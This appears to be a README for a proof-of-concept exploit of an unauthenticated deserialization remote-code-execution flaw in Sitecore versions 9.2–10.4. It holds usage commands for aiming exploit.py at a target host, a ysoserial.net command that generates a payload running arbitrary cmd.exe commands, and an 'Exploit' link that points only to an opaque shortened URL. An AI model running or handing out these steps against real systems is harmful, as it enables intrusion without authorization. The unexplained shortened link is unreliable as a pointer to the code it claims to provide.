# CVE-2025-34138 Sitecore Experience Platform Unauthenticated RCE Exploit

## Overview
This repository contains a proof-of-concept (PoC) exploit for **CVE-2025-34138**, a critical unauthenticated remote code execution (RCE) vulnerability affecting Sitecore Experience Manager (XM), Experience Platform (XP), Experience Commerce (XC), and Managed Cloud versions 9.2 through 10.4. The exploit targets a deserialization flaw, enabling attackers to execute arbitrary commands without authentication.

**CRITICAL WARNING**: This code is for **educational and authorized testing purposes only**. Unauthorized use against systems without explicit, written permission is **illegal** and may result in severe legal consequences. Always obtain authorization before testing.

## Vulnerability Details
- **CVE ID**: CVE-2025-34138
- **Affected Versions**: Sitecore XM, XP, XC, Managed Cloud 9.2–10.4
- **CVSS Score**: 9.3 (Critical)
- **Description**: An unauthenticated RCE vulnerability allowing arbitrary code execution or unauthorized data access, due to unsafe deserialization in a Sitecore component.

## Prerequisites
- **Python 3.8+**
- **ysoserial.net**: Required to generate a payload. Download from [ysoserial.net](https://github.com/pwntester/ysoserial.net).
- A vulnerable Sitecore instance (for authorized testing only).

## Usage
Run the exploit with:
```bash
python exploit.py <hostname> [--command <command>]
```
- `<hostname>`: Target Sitecore instance (e.g., `vuln-sitecore.com`).
- `--command`: Command to execute (default: `cmd.exe /c whoami`).

Example:
```bash
python exploit.py vuln-sitecore.com --command "cmd.exe /c calc.exe"
```

## How It Works
1. **Vulnerability Test**: Sends a probe payload to confirm the target’s susceptibility to deserialization attacks, checking for specific response patterns.
2. **Payload Delivery**: Submits a crafted HTTP POST request with a base64-encoded `BinaryFormatter` payload to trigger RCE.
3. **Execution**: If vulnerable, the payload is deserialized, executing the specified command.
4. **Response Handling**: Outputs the server’s response to verify exploitation success.

## Generate Payload
   ```bash
   ./ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd.exe /c your_command_here"
   ```
Replace the `dummy_payload` variable in `exploit.py` with the generated base64 string.

## Limitations
- Success depends on the target’s configuration and accessibility.
- Mitigations (e.g., WAF, serialization filters) may block exploitation.

## Ethical Use
- **DO NOT** use this exploit without explicit, written permission from the system owner.
- This PoC is for security researchers, penetration testers, and administrators testing in authorized environments.

## [Exploit](https://tinyurl.com/mr2n46jd)

## Disclaimer
The author is not liable for any misuse or damages caused by this exploit. Use at your own risk and only with proper authorization.
